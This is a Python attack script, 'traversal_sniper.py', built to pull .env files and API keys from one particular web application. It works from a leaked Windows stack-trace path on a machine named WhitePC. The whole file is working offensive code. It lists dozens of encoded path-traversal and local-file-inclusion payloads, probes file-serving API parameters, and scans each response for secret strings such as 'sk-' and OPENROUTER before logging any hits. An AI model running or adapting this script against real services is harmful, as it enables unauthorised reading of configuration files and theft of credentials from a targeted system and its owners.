"""
traversal_sniper.py — Targeted Path Traversal Key Extraction
Using leaked stack trace path (C:\\Users\\WhitePC\\Rooms\\Coderoom\\CLI\\StudioCLI\\web\\)
to craft precise traversal payloads targeting .env and config files.
"""
import sys, os, argparse, urllib.request, urllib.error, urllib.parse, json, re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

# Known from stack trace: app root = StudioCLI/web/
# If static files are served from web/public or web/dist, traversal depth varies.
# Try all realistic depths.

TARGETS = [".env", ".env.local", ".env.production", ".env.development",
           "package.json", "server.js", "index.js", "app.js", ".env.example"]

TRAVERSALS = [
    # Standard double-dot sequences
    "../", "../../", "../../../", "../../../../", "../../../../../",
    # URL encoded single
    "%2e%2e%2f", "%2e%2e/", "..%2f",
    # Double-encoded
    "%252e%252e%252f", "%252e%252e/",
    # Backslash (Windows)
    "..\\", "..%5c", "%2e%2e%5c",
    # Mixed slash
    "..%2F", "..%5C",
    # Overlong encoding
    "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af",
    # Unicode variants
    "%e2%80%ae", "‥/",
    # Null byte bypass
    "%00../",
    # Multiple path confusion
    "static/../", "assets/../", "public/../",
    "dist/../", "build/../", "src/../",
    "static/../../", "assets/../../",
]

# Static asset paths the server likely serves from
STATIC_ROOTS = [
    "/",
    "/static/",
    "/assets/",
    "/public/",
    "/files/",
    "/img/",
    "/js/",
    "/css/",
    "/api/static/",
]

# Specific traversal paths combining known app structure
PRECISE_TRAVERSALS = [
    # If serving from web/public: ../  goes to web/, ../../ to CLI/
    "/../.env",
    "/../../.env",
    "/../../../.env",
    "/../server.js",
    "/../index.js",
    "/../package.json",
    "/../.env.local",
    # Encoded variants of above
    "/%2e%2e/.env",
    "/%2e%2e/%2e%2e/.env",
    "/%2e%2e/server.js",
    "/%2e%2e%2f.env",
    "/%2e%2e%2f%2e%2e%2f.env",
    # Static file bypass via known paths
    "/static/../.env",
    "/assets/../.env",
    "/js/../.env",
    "/css/../.env",
]

# Windows-specific paths (target is Windows: C:\Users\WhitePC\...)
WINDOWS_PATHS = [
    "/C:/Users/WhitePC/Rooms/Coderoom/CLI/StudioCLI/web/.env",
    "/%43%3a%2fUsers%2fWhitePC%2fRooms%2fCoderoom%2fCLI%2fStudioCLI%2fweb%2f.env",
    "/..%2F..%2F..%2F..%2F..%2F.env",
    "/..\\..\\..\\.env",
    "/..%5C..%5C..%5C.env",
]

# Parameter injection for static file endpoints
PARAM_TRAVERSALS = [
    "/api/health?file=../.env",
    "/api/health?path=../.env",
    "/api/config?file=../.env",
    "/api/config?include=../.env",
    "/api/config?load=../.env",
    # open redirect / LFI combos
    "/api/chat?template=../../.env",
    "/api/chat?persona=../../.env",
]


class TraversalSniper(VibeTool):
    def __init__(self):
        super().__init__("Traversal Sniper", "Targeted Path Traversal for .env Key Extraction")
        self.hits = []

    def _try_path(self, base, path, label=""):
        url = base + path
        try:
            r = urllib.request.urlopen(url, timeout=5)
            body = r.read().decode(errors="replace")
            ct = r.headers.get("Content-Type", "")
            # Check for .env or JS content
            is_interesting = (
                "OPENROUTER" in body or
                "API_KEY" in body or
                "sk-or" in body or
                "sk-" in body or
                re.search(r"[A-Z_]+=.{10,}", body) or   # env var format
                (r.status == 200 and "html" not in ct.lower() and len(body) > 20)
            )
            if is_interesting:
                self.log(f"[HIT] {path} ({len(body)}b, {ct}): {body[:300]}", "hack")
                self.hits.append((path, body[:500]))
            elif r.status == 200:
                self.log(f"[200 but meh] {path}: {body[:80]}")
            return r.status, body
        except urllib.error.HTTPError as e:
            if e.code not in (404, 405):
                self.log(f"[{e.code}] {path}")
            return e.code, ""
        except Exception:
            return 0, ""

    def vector_precise(self, base):
        self.log("=== PRECISE: Known Path Traversal ===")
        for path in PRECISE_TRAVERSALS:
            self._try_path(base, path, "precise")

    def vector_static_roots(self, base):
        self.log("=== STATIC ROOTS: Static File Endpoint Traversal ===")
        for root in STATIC_ROOTS:
            for target in TARGETS[:4]:  # focus on .env variants
                for traversal in ["../", "../../", "../../../", "%2e%2e/"]:
                    path = root + traversal + target
                    self._try_path(base, path)

    def vector_windows(self, base):
        self.log("=== WINDOWS: Windows Absolute Path Injection ===")
        for path in WINDOWS_PATHS:
            self._try_path(base, path)

    def vector_params(self, base):
        self.log("=== PARAMS: Parameter-Based LFI ===")
        for path in PARAM_TRAVERSALS:
            self._try_path(base, path)

    def vector_known_files(self, base):
        """Fetch known files that might be served accidentally."""
        self.log("=== KNOWN FILES: Direct Access to Common Files ===")
        paths = [
            "/package.json",
            "/package-lock.json",
            "/.env",
            "/.env.example",
            "/server.js",
            "/index.js",
            "/app.js",
            "/config.js",
            "/webpack.config.js",
            "/vite.config.js",
            "/next.config.js",
            "/vercel.json",
            "/render.yaml",
            "/.github/workflows/deploy.yml",
            "/Dockerfile",
            "/docker-compose.yml",
        ]
        for p in paths:
            s, body = self._try_path(base, p)
            if s == 200 and body:
                self.log(f"  [ACCESSIBLE] {p}: {body[:200]}", "warn")

    def vector_api_file_serve(self, base):
        """Some APIs have file-serving endpoints; probe likely patterns."""
        self.log("=== API FILE SERVE: Endpoint-Based File Access ===")
        payloads = [
            "/api/file?name=.env",
            "/api/file?path=.env",
            "/api/file?f=.env",
            "/api/file?filename=.env",
            "/api/serve?file=.env",
            "/api/resource?path=.env",
            "/api/download?file=.env",
            "/api/export?file=.env",
            "/api/read?file=.env",
            "/api/open?file=.env",
            # encoded
            "/api/file?name=%2e%2e%2f.env",
            "/api/file?path=..%2F.env",
            "/api/file?name=..%5C.env",
        ]
        for p in payloads:
            s, body = self._try_path(base, p)
            if s not in (404, 405, 0):
                self.log(f"  [{s}] {p}: {body[:150]}", "warn" if s == 200 else "info")

    def run(self, url):
        self.banner()
        base = url.rstrip("/")

        self.vector_precise(base)
        self.vector_known_files(base)
        self.vector_api_file_serve(base)
        self.vector_static_roots(base)
        self.vector_windows(base)
        self.vector_params(base)

        self.log("================================")
        if self.hits:
            self.log(f"TRAVERSAL CONFIRMED — {len(self.hits)} file(s) read!", "hack")
            for path, content in self.hits:
                self.log(f"  {path}:", "hack")
                self.log(f"  {content}", "hack")
        else:
            self.log("No traversal confirmed. Static files properly jailed.", "warn")


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    args = parser.parse_args()
    TraversalSniper().run(args.url)
